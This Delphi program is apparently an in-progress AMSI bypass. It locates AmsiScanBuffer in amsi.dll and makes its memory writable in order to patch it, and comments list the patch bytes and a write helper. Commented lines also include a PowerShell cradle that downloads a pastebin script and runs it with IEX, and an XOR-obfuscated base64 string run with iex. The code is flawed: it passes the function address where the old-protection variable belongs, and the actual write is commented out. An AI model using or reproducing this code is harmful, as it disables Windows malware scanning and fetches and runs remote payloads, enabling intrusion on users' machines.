{http://docwiki.embarcadero.com/RADStudio/Sydney/en/Libraries_and_Packages_(Delphi)
https://github.com/rasta-mouse/AmsiScanBufferBypass/blob/main/AmsiBypass.cs
https://stackoverflow.com/questions/2229699/ok-to-use-virtualprotect-to-change-resource-in-delphi
https://progamercity.net/delphi/789-snippet-write-bytes-memory.html


Prots
http://winapi.freetechsecrets.com/win32/WIN32VirtualProtect.htm
}

//x86-64 ret 0xC3
//x86-64 patch 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3

//Function WriteIt(pAddress: Pointer; Bytes: Array of Byte): Boolean;
//var
//  OldProtect, DummyProtect: DWord;
//begin
//  if VirtualProtect(pAddress, SizeOf(Bytes), PAGE_EXECUTE_READWRITE, @OldProtect) then
//   begin
//    Move(Bytes, pAddress^, Length(Bytes));
//    VirtualProtect(pAddress, SizeOf(Bytes), OldProtect, @DummyProtect);
//    Result := True
//   end
//   else
//    Result := False;
//end;


// (new-object net.webclient).downloadstring('http://pastebin.com/raw.php?i=JHhnFV8m') | IEX

//or

// $base64 = "FHJ+YHoTZ1ZARxNgUl5DX1YJEwRWBAFQAFBWHgsFAlEeBwAACh4LBAcDHgNSUAIHCwdQAgALBRQ="
// $bytes = [Convert]::FromBase64String($base64)
// $string = -join ($bytes | % { [char] ($_ -bxor 0x33) })
// iex $string

program BasedAmsi_E;
{$APPTYPE CONSOLE}

uses
  SysUtils,
  Windows,
  Vcl.Forms;

var
  amsee, kersee : THandle;
  amsibaseaddr, kernbaseaddr : pointer;
  OldProtect, DummyProtect : DWord;
  retpatch : Array[0..0] of byte = ($C3);


begin
  try
    // Load amsi.dll , find AmsiScanBuffer
    amsee := SafeLoadLibrary('C:\\Windows\\System32\\amsi.dll');
    if amsee <> 0 then begin
      amsibaseaddr := GetProcAddress(amsee,'AmsiScanBuffer');
      WriteLn(Format('amsi.dll base address: %p',[amsibaseaddr]));
    end
    else begin
    WriteLn('Failed to load');
    end;


    //Set region to RWX
    VirtualProtect(amsibaseaddr, SizeOf(retpatch), PAGE_EXECUTE_READWRITE, amsibaseaddr);

    //Copy Patch
    //WriteIt(amsibaseaddr,(retpatch));


    //Move(Bytes, pAddress^, Length(Bytes));

    //Restore region to RX
    VirtualProtect(amsibaseaddr, SizeOf(retpatch), PAGE_EXECUTE_READ, amsibaseaddr);

  finally
    FreeLibrary(amsee);
  end;
end.




